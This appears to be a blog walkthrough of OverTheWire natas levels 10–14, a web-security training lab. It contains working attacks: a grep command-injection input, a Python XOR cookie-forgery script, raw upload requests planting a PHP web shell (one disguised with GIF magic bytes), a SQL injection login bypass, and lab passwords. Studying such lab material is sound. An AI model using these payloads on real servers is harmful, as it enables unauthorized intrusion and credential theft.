---
layout: post
title: Walkthrough - OverTheWire natas 10 - 14
related_posts:
  - blog/_posts/2019-03-18-overthewire-natas-10-14.md
description: >
  A walkthrough of OverTheWire natas 10 - 14 with tool recommendations,
  recommendations for further reading, recommendations for protecting your server
  against attackers, failures and wins. Natas level 10-14 is quite easy,
  giving you a very gentle introduction to this wargame.
---
# OverTheWire natas 10 - 14
* this unordered seed list will be replaced by toc as unordered list
{:toc}
## Introduction
[OverTheWire](http://overthewire.org) is a wargame site with several challenges.
It contains several challenges with a nice increase in
difficulty.
This is the third entry of a writeup of the [natas](http://overthewire.org/wargames/natas/)
challenges, which teaches the basics of serverside web-security. I will walk you through the mind-process
of searching for and finding vulnerabilities.

By going through all the levels of these challenges, you will learn how to
break basic security (and protect against these attacks!), gain basic knowledge on various
tools such as: html, server configuration, browser developer tools,
basic shell commands, vulnerability checker tools, kali linux and get some basic
programming experience.

## [Level 10](http://natas10.natas.labs.overthewire.org/)
We are on this level met with yet another search, with a hint that they filter certain characters. 
This time also they have been kind enough to give us the server source code.
![Natas 10 landing page](/assets/img/blog/natas/overthewire-natas-10-1.png)
~~~php
// file: "index.php"
For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
~~~
Passthru is still used, as in natas9, and they filter against these characters: `;|&`
Well, we could just grep for an empty string in any file, and we will get the entire file. 
Thus a search for `"" /etc/natas_webpass/natas11 #` that contains no illegal characters will give us the password
for natas11.  


whitelist, not blacklist
{:.note}
<details>
  <summary>Spoiler</summary>
  natas11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
</details>

## [Level 11](http://natas11.natas.labs.overthewire.org/)
We are met with a hint "Cookies are protected with [XOR encryption](https://en.wikipedia.org/wiki/XOR_cipher)", an input field prefilled with a [hex triplet](https://en.wikipedia.org/wiki/Web_colors), a button, and the sourcecode.
If we change the color, the background of that page changes the color. 
![Natas 11 landing page](/assets/img/blog/natas/natas11-1.png)
~~~php
// file: "index.php"
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

~~~
Looking at the sourcecode, it is clear that we need to get the variable `$data["showpassword"]` changed from no to yes.
It seems like if we set a bgcolor from the page the data is updated and the function `saveData` is called. 
`saveData` does a [json-encoding](https://en.wikipedia.org/wiki/JSON), xor encryption, [base64 encoding](https://en.wikipedia.org/wiki/Base64) and sets this as a cookie.
The other function 'loadData' does the opposite reading the values from a cookie. Finally there is the actual XOR encryption. A basic XOR encryption 
with a key that we do not get.

So it seems our task is to manipulate the cookie, as that is where the showpassword key is. XOR encryption is quite simple
to break:
A plaintext XORed with a key result in an encrypted bytes.  
Opposite, encrypted bytes XORed with the key, result in the plaintext.  
Interesting enough, plaintext XORed with encrypted will result in the key.  
We can use that last rule as our attack, as we know the plaintext, and we know the encrypted bytes (they are in the cookie).
When we successfully have retrieved the key, its trivial the encrypt a new cookie, request the page and retrieve the password.
I will do this programmatically with python, comments in the code explain what I do.
~~~python
# file: "exploit.py"
import requests
import urllib.parse
import base64

url = 'http://natas11:<redacted>@natas11.natas.labs.overthewire.org/'


def xor(bytes1, bytes2):
    return bytes([b1 ^ b2 for (b1, b2) in zip(bytes1, bytes2)])


# Get the initial page with the supplied username/password.
res = requests.get(url)

# Get the data cookie, base64 decode it resulting in encrypted bytes.
encrypted = base64.b64decode(urllib.parse.unquote(res.cookies['data']))

# Using a small piece if the json representation of the default-data as left side of xor, and encrypted bytes as right side.
# Try and fail gives us the xor key length, and here it was 4 characters.
xorKey = xor(b'{"sh', encrypted)

# recreate a fake cookie (using 44 as total length), and request the server again.
data = base64.b64encode(xor(xorKey * 11, b'{"showpassword":"yes","bgcolor":"#ffffff"}  ')).decode()

result = requests.get(url, cookies={'data': data}).content.decode()
i1 = result.index('The password for natas12 is ')
i2 = result.index('<br>', i1)
print(result[i1:i2])
~~~


Don't use XOR for encryption. Ever.
{:.note}
<details>
  <summary>Spoiler</summary>
  natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
</details>

## [Level 12](http://natas12.natas.labs.overthewire.org/)
![Natas 12 landing page](/assets/img/blog/natas/natas12-1.png)
We are met with an image upload code, and yet again, source code.
~~~php
// file: "index.php"
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?> 
~~~
It seems we can upload files, restricted to jpeg, but the restriction seems "a bit" shady. 
Lets use burp suite to see if we can upload what we want. Start by uploading any file, then change the request in burp repeater:
~~~
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas12.natas.labs.overthewire.org/
Content-Type: multipart/form-data; boundary=---------------------------761051921490452581253734734
Content-Length: 501
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------761051921490452581253734734
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------761051921490452581253734734
Content-Disposition: form-data; name="filename"

test.php
-----------------------------761051921490452581253734734
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: text/php

<?php echo(passthru($_REQUEST["test"]));?>
-----------------------------761051921490452581253734734--
~~~
Resulting in `File uploaded successfully` and a link to the file. Now its just a matter of opening the url, view source, 
(to make output easier to read), and you have a poor mans browser shell to the server.
Retrieve the password for the next level by opening the url [view-source:http://natas12.natas.labs.overthewire.org/upload/p4kd1uhtkk.php?test=cat%20/etc/natas_webpass/natas13](view-source:http://natas12.natas.labs.overthewire.org/upload/p4kd1uhtkk.php?test=cat%20/etc/natas_webpass/natas13)
![natas12-2.png].
Read more on this vulnerability (Unrestricted file upload) on [OWASP](https://www.owasp.org/index.php/Unrestricted_File_Upload).


Make sure to restrict file upload
{:.note}
<details>
  <summary>Spoiler</summary>
  natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
</details>

## [Level 13](http://natas13.natas.labs.overthewire.org/)
![Natas 13 landing page](/assets/img/blog/natas/natas13-1.png)
We are met with an image upload code again, this time with restrictions, and yet again, source code.
~~~php
// file: "index.php"
For security reasons, we now only accept image files!<br/><br/>

<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>  
~~~
It seems we can upload images, restricted to jpeg. This time they have added an exif_imagetype check to see if it
actually is an image. 
It's quite easy to fool this check, so we are able to uplad what we want anyway. exif_imagetype only checks
the first few [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) to see if this is an image, so we can just prepend our php file with these bytes,
and bob's your uncle.
~~~
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas13.natas.labs.overthewire.org/
Content-Type: multipart/form-data; boundary=---------------------------5940814761936928397739684905
Content-Length: 513
Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------5940814761936928397739684905
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------5940814761936928397739684905
Content-Disposition: form-data; name="filename"

test.php
-----------------------------5940814761936928397739684905
Content-Disposition: form-data; name="uploadedfile"; filename="test.php"
Content-Type: text/php

GIF89a
<?php echo(passthru($_REQUEST["test"]));?>
-----------------------------5940814761936928397739684905--
~~~
Resulting in `File uploaded successfully` and a link to the file. Now its just a matter of opening the url, view source, 
(to make output easier to read), and you have a poor mans browser shell to the server, just as natas12
Retrieve the password for the next level by opening the url [view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14](view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14)


Checking file type is not enough
{:.note}
<details>
  <summary>Spoiler</summary>
  natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
</details>

## [Level 14](http://natas14.natas.labs.overthewire.org/)
![Natas 14 landing page](/assets/img/blog/natas/natas14-1.png)
We are met with a username/password login page, and sourcecode.
~~~php
// file: "index.php"
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?> 
~~~
A [database](https://en.wikipedia.org/wiki/Database) connection to [mysql](https://www.mysql.com/) is established, then a [SQL query](https://en.wikipedia.org/wiki/SQL) executed against the database.
The query checks the username and password, and if it finds a result, we get the password we want. 
Otherwise we are denied.
The glaring error on this page is [SQL injection](https://www.owasp.org/index.php/SQL_Injection).
Use username `" OR 1=1 -- -` for instant win.  


SQL injection flaws are more common than you think
{:.note}
<details>
  <summary>Spoiler</summary>
  natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
</details>